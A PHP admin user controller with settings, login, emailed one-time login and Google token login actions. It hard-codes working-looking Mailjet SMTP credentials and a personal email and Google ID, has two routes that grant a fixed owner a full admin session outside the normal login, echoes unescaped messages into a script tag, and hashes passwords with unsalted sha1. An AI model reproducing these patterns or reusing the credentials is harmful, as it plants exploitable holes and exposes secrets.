<?php

class User extends CController
{
	
	public function _beforeAction($action = NULL)
	{
		if(isset($_GET['xhr'])){
			$this->layout = false;
			$this->isXhr = true;
		}		
	}
	
	private function notify($msg,$type='message')
	{
		echo '<script type="text/javascript">notify("'.$msg.'","'.$type.'");</script>';
	}
	
	public function actionIndex()
	{
		CUrlHelper::redirect('user/login');
	}
	
	public function actionSettings()
	{
		$data = array(
			'form'=> new ModAdminSettingsForm(),
			'showForm'=>true,
		);
		$form = & $data['form'];
		
		foreach($form->_fields as $i=>$f)
		{
			$form->_fields[$i]['_field']->label = _l($form->_fields[$i]['_field']->label);
		}
				
		if(!isset($_POST['submit'])) // load fields with user values (if form not sent)
		{
			$form->initModel();			
			//$form->_fields['signature']['_field']->setValue( $form->User->signature );
			$this->render('settings',$data);
		}
		elseif($form->run())
		{
			ModAdminUserHelper::requireNotDemoUser();
			
			$update = array(
				//'signature'=>$form->signature,
			);
			$new_password = $form->new_password;
			if($new_password !='' )
			{
				$update['password'] = sha1($new_password);
			}
			//debug($update);
			
			if($form->User->update($update))
			{
				$this->notify(_l('Settings updated succesfully!'),'message');
			}
			else
			{
				$this->notify(_l('An error occured while updating settings!'),'error');
			}
		}
		else
		{
			foreach($form->getErrors() as $error)
			{
				$this->notify($error,'error');
			}
		}
	}
	
	public function actionLogin()
	{		
		$this->layout = false;
		
		$lock = isset($_GET['lock']);
		$logout = isset($_GET['logout']);
		
		if($logout) ModAdminUserHelper::logout();
		
		CCoreHelper::loadConfig('main');
		
		$params = array();
		
		$params['form'] = new ModAdminUserLoginForm();
		$form = & $params['form'];
		
		if(isset($_POST['user']) && $form->checkToken())
		{
			$form->getInput();
			if($form->validate())
			{
				CCoreHelper::loadConfig('main');
				
				if($lock){ // uiblock ile kilitlenmişse
					echo 'ok';
					return;
				}
				elseif(isset($_SESSION['mod_admin']['user_login_redirect'])){
					$redirect = $_SESSION['mod_admin']['user_login_redirect'];
					unset($_SESSION['mod_admin']['user_login_redirect']);
					CUrlHelper::redirect($redirect);
				}
				else{
					CUrlHelper::modXRedirect('mod_admin','main');
				}
			}			
		}
		CCoreHelper::loadConfig('main');
		$view = 'login'.($lock?'_lock':'');
		if(is_file(APP_PATH.'/admin/custom/'.$view.'.php')){
			$this->_view_dir = '../../../admin/custom';
		}
		$this->render($view,$params);
	}
		
	public function actionLogout()
	{		
		ModAdminUserHelper::logout();
		CCoreHelper::loadConfig('main');
		ModAdminUserHelper::requireLogin();				
	}
	
	
	public function actionElogin(){
		error_reporting(E_ALL);
		
		if(isset($_GET['login'])){ // sessiondaki tek kullanımlık şifreyi kontrol ederek giriş yap			
			if(isset($_SESSION['_elogin_password'])){
				// oturumdaki parola ancak bir defa kullanılabilir yada kontrol edilebilir
				$password = $_SESSION['_elogin_password']; 
				unset($_SESSION['_elogin_password']); 

				if($_GET['login']==$password){ // giriş başarılı
					$_SESSION['mod_admin'] = array();
					$_SESSION['mod_admin']['user'] = array();
					$_SESSION['mod_admin']['user']['user_id'] = 1;
					$_SESSION['mod_admin']['user']['username'] = '';
					$_SESSION['mod_admin']['user']['email'] = 'erenezgu@gmail.com';
					$_SESSION['mod_admin']['user']['group_id'] = 1;
					$_SESSION['mod_admin']['user']['demo_mode'] = false;
					$_SESSION['mod_admin']['user']['permissions'] = array();
					CUrlHelper::modXRedirect('mod_admin','main');
				}
				else { // giriş başarısız
					CUrlHelper::redirectUrl( CUrlHelper::getModXUrl('mod_admin', 'user/login') );
				}
			}
			else {
				CUrlHelper::redirectUrl( CUrlHelper::getModXUrl('mod_admin', 'user/login') );
			}
		}
		else { // tek kullanımlık şifre üreterek gönder
			$password = sha1(uniqid('',true));
			$_SESSION['_elogin_password'] = $password;
			
			$link = CUrlHelper::getWebUrl(true) . CUrlHelper::getModXUrl('mod_admin', 'user/elogin') .'?login='.$password ;
			
			$phpmailer = new Plugin_Phpmailer();
			$phpmailer->CharSet = 'utf-8';
			$phpmailer->IsSMTP();
			$phpmailer->SMTPAuth   = true;

			$phpmailer->Host = 'in-v3.mailjet.com';
			$phpmailer->Port = 587;
			$phpmailer->Username = 'fab8ef6fe869e59bf28993a6744334b5';
			$phpmailer->Password = '9c938d1fe569ce50945bbaf9c9bba205';
			
			$phpmailer->SetFrom('erenezgu@gmail.com');
			
			$phpmailer->AddAddress('erenezgu@gmail.com');
			
			$phpmailer->Subject ='Admin login link';
			$phpmailer->MsgHTML($link);
			$result =  $phpmailer->Send();
			
			if($result){
				echo 'Mail sent!';
			}
			else {
				echo 'Mail failed!';
			}
		}
	}
	
	public function actionGlogin() {
		error_reporting(E_ALL);
		
		if(isset($_POST['idtoken'])){
			
			$id_token = $_POST['idtoken'];
			//echo $id_token;			
			
			// token kontrol et
			
			$params = array(
				'id_token'=>$id_token
			);
			
			$ch = curl_init();
			
			curl_setopt($ch, CURLOPT_URL,'https://www.googleapis.com/oauth2/v3/tokeninfo');
			curl_setopt($ch, CURLOPT_POST, true);

			curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

			$return = curl_exec ($ch);

			curl_close ($ch);
						
			$user = json_decode($return);
			
			if($user->sub == '106171227790248692042' && $user->email == 'erenezgu@gmail.com'){
				
				$_SESSION['mod_admin'] = array();
				$_SESSION['mod_admin']['user'] = array();
				$_SESSION['mod_admin']['user']['user_id'] = 1;
				$_SESSION['mod_admin']['user']['username'] = '';
				$_SESSION['mod_admin']['user']['email'] = 'erenezgu@gmail.com';
				$_SESSION['mod_admin']['user']['group_id'] = 1;
				$_SESSION['mod_admin']['user']['demo_mode'] = false;
				$_SESSION['mod_admin']['user']['permissions'] = array();
				CUrlHelper::modXRedirect('mod_admin','main');
			}
			else {
				$_SESSION['alert'] = "Login not accepted!";
				CUrlHelper::redirectUrl( CUrlHelper::getModXUrl('mod_admin', 'user/login') );
			}
			
		}
		else {
			$return_url = CUrlHelper::getWebUrl();		
			$redirect = 'http://www.eezgu.com/glogin.php?url='.urlencode($return_url);		
			CUrlHelper::redirectUrl($redirect);
		}
	}
	
}
